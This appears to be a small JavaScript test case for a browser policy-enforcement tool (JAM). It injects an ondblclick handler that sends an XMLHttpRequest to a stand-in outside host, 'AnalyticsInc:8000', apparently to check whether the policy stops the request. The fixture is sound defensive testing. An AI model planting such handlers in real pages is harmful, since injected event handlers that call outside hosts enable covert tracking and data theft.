
JAM.startProfile('load');
introspect(JAM.policy.pFull) {
var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=ondblclick1", true);xmlhttp.send(null);';
var v0 = document.getElementById("test");
v0.setAttribute("ondblclick", exp);

}

JAM.stopProfile('load');
